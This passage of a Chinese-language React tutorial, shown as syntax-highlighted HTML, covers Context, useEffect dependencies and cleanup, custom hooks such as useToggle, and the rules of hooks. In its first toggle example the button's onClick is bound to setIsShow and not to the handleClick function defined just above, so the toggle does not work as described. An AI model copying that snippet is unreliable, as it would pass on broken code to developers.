#D4D4D4">=</span><span style="color: #CE9178">"B"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">This is B component</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">C</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">C</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">C</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">bMsg</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">useContext</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">MsgContext</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"C"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">This is C component. </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">bMsg</span><span style="color: #569CD6">}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>传递多个数据 <code>&lt;MsgContext.Provider value={[AppMsg, AppMsg2]}&gt;</code>，需要用数组进行传递。</p><div class="note info flat"><p>实际上，任何能够形成顶层 - 底层层级的组件关系都可以使用 Context 进行通信。</p><p>例如，父子关系也是一种顶层 - 底层关系。</p></div><h2 id="useeffect-概念"><a class="markdownIt-Anchor" href="#useeffect-概念"></a> useEffect 概念</h2><p>useEffect 是一个 <code>React Hook</code> 函数，用于在 React 组件中创建不是由事件引起而是<strong>由渲染本身引起的</strong>操作，比如发送 AJAX 请求，更改 DOM 等等。</p><p>一个简单的场景是：当组件加载完毕之后需要获取数据（发送请求），实现数据渲染。</p><p>语法：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">useEffect</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {}, []);</span></span></code></pre></div></div></figure><ul><li>参数 1 是一个函数，可以把它叫做副作用函数，在函数内部可以放置要执行的操作。</li><li>参数 2 是一个数组（可选），在数组里放置依赖项，不同依赖项会影响第一个参数函数的执行，<strong>当是一个空数组的时候，副作用函数只会在组件渲染完毕之后执行一次。</strong></li></ul><p>代码可以是：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useEffect</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">useState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">requestUrl</span><span style="color: #D4D4D4"> =</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #CE9178">"https://smart-shop.itheima.net/index.php?s=/api/goods/list&amp;categoryId=10036"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">resList</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">setResList</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useState</span><span style="color: #D4D4D4">([]);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">useEffect</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">fetchData</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">fetch</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">requestUrl</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">data</span><span style="color: #D4D4D4"> } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">json</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">setResList</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">fetchData</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  }, []);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">ul</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">resList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">map</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">li</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_name</span><span style="color: #569CD6">}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">li</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        ))</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">ul</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">hr</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>依赖项的具体影响如下表：</p><table><thead><tr><th style="text-align:center">依赖项</th><th style="text-align:left">副作用函数执行时机</th></tr></thead><tbody><tr><td style="text-align:center">没有依赖项：不写</td><td style="text-align:left">组件初始渲染 + 组件更新时执行</td></tr><tr><td style="text-align:center">空数组依赖：[ ]</td><td style="text-align:left"> 只在初始渲染时执行一次</td></tr><tr><td style="text-align:center">特定依赖项：[example]</td><td style="text-align:left"> 组件初始渲染 + 特定依赖项变化时执行</td></tr></tbody></table><h2 id="useeffect-清除副作用"><a class="markdownIt-Anchor" href="#useeffect-清除副作用"></a> useEffect - 清除副作用</h2><p>在 useEffect 中编写的由渲染本身引起的对接组件外部的操作，社区也经常把它叫做副作用操作。比如在 useEffect 中开启了一个定时器，我们想在组件卸载时把这个定时器再清理掉，这个过程就是清理副作用。</p><p>语法：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">useEffect</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  ...</span><span style="color: #9CDCFE">副作用操作逻辑</span><span style="color: #D4D4D4">...</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #9CDCFE">清除副作用逻辑</span><span style="color: #D4D4D4">...</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">})</span></span></code></pre></div></div></figure><p>也就是在 return 中新写一个函数，该函数<strong>最常见</strong>的执行时机是在<strong>组件卸载时自动执行</strong>。</p><p>例如，在 Son 组件中开启一个定时器，卸载时清除这个定时器。代码可以是：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useEffect</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">useState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">B</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">useEffect</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">setInterval</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"工作中..."</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }, </span><span style="color: #B5CEA8">1000</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">clearInterval</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  }, []);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"B"</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">isShow</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">setIsShow</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useState</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">isShow</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">B</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #D4D4D4">() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">setIsShow</span><span style="color: #D4D4D4">(!</span><span style="color: #9CDCFE">isShow</span><span style="color: #D4D4D4">)</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">卸载B</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><h2 id="react-自定义-hook-函数"><a class="markdownIt-Anchor" href="#react-自定义-hook-函数"></a> React 自定义 hook 函数</h2><p>假设要实现一个将某元素结构隐藏 / 显示的按钮逻辑，代码可以是：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">isShow</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">setIsShow</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useState</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">handleClick</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setIsShow</span><span style="color: #D4D4D4">(!</span><span style="color: #9CDCFE">isShow</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">isShow</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h2</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">This is John Wick.</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h2</span><span style="color: #808080">&gt;</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">setIsShow</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">Toggle</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>但很显然，这种切换元素结构隐藏或显示的代码是经常使用的，如果每一次都需要手动再写一次较为麻烦，于是这里引出封装自定义 hook 函数。</p><ol><li>声明一个以 use 打头的函数</li><li>在函数体内封装可复用的逻辑（只要是可复用的逻辑）</li><li>把组件中用到的状态或者回调 return 出去（以对象或者数组）</li><li>在哪个组件中要用到这个逻辑，就执行这个函数，解构出来状态和回调进行使用</li></ol><p>所以，代码也可以是下面这种：</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">useToggle</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">isShow</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">setIsShow</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useState</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">toggle</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setIsShow</span><span style="color: #D4D4D4">(!</span><span style="color: #9CDCFE">isShow</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> [</span><span style="color: #9CDCFE">isShow</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">toggle</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">isShow</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">toggle</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useToggle</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">isShow</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">h2</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">This is John Wick.</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">h2</span><span style="color: #808080">&gt;</span><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">onClick</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">{</span><span style="color: #9CDCFE">toggle</span><span style="color: #569CD6">}</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">Toggle</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><div class="note warning flat"><p>warning</p><ol><li>hook 函数只能在组件中或者其他自定义 hook 函数中调用</li><li> hook 函数只能在组件的顶层调用，不能嵌套在 if、for 或者其他函数中</li></ol></div><p>下面两种调用方式都是错误的：</p><ol><li><p>组件外调用</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">useToggle</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">isShow</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">setIsShow</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useState</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">toggle</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setIsShow</span><span style="color: #D4D4D4">(!</span><span style="color: #9CDCFE">isShow</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> [</span><span style="color: #9CDCFE">isShow</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">toggle</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #6A9955">// 这将报错：React Hook “useToggle” 不能在顶层调用。React Hook 必须在 React 函数组件或自定义 React Hook 函数中调用。</span></span><span class="line"><span style="color: 